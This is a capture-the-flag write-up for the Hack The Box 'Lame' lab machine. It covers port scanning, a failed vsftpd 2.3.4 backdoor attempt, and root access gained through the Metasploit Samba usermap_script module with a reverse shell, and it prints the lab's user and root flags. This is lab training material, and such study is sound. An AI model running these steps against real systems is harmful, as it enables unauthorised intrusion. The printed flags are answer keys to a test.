Running our initial scan of the HTB Lame machine with `nmap`

```php
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

Some points of interest:
- Port 21 - `vsftpd 2.3.4`
- Port 22 - `OpenSSH 4.7.p1`
- Port 445 - `samba 3.0.20`

We attempt to connect to ports 21 and 22 with `telnet`

```php
telnet 10.129.26.62 21

>Trying 10.129.26.62...
>Connected to 10.129.26.62.
>220 (vsFTPd 2.3.4)
>530 Please login with USER and PASS.
```

```php
telnet 10.129.26.62 22

>Trying 10.129.26.62...
>Connected to 10.129.26.62.
>SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
>Protocol mismatch.
>Connection closed by foreign host.
```

These were dead ends. No logins for port 21 and nothing on port 22 that was useful.

Lets look at `vsftpd 2.3.4`, this is a known vulnerability in `metasploit`

```php
search vsftpd 2.3.4
>0  exploit/unix/ftp/vsftpd_234_backdoor

use 0
```

Set the `RHOSTS` to the lame machine IP address

```php
[*] 10.129.26.62:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.26.62:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

We see that upon running the exploit that it fails to connect, another dead end

Lets look at `samba 3.0.20`, this is another known vulnerability in `metasploit`

```php
search samba 3.0.20
>0  exploit/multi/samba/usermap_script

use 0
```

Remember to set `LHOST` to the HTB secret tunnel `IPV4` address 

```php
[*] Started reverse TCP handler on 10.10.14.209:4444 
[*] Command shell session 1 opened (10.10.14.209:4444 -> 10.129.26.62:40677) at 2025-06-01 20:15:48 -0400

whoami
root
```

We are granted remote code execution on the lame machine
We find the flags in the home and root directory by exploring the system.

User Flag: `4ea88b7e036c45437527852ae6bdf160`
Root Flag: `e14e35a85c745af457e84012bf9ecaef`

Running `netstart -tnlp` we can see way more ports are actually listening than the four we found from our scan. 
The reason our `VSFTPd` exploit failed is because port 21 was behind a firewall.

`VSFTPd` 2.3.4 backdoor command execution exploit
https://www.exploit-db.com/exploits/49757
When the backdoor is triggered it starts listening on port 6200
The exploit does listen on Lame

```php
[*] 10.129.26.62:21 - Banner: 220 (vsFTPd 2.3.4)
```

We have rooted this machine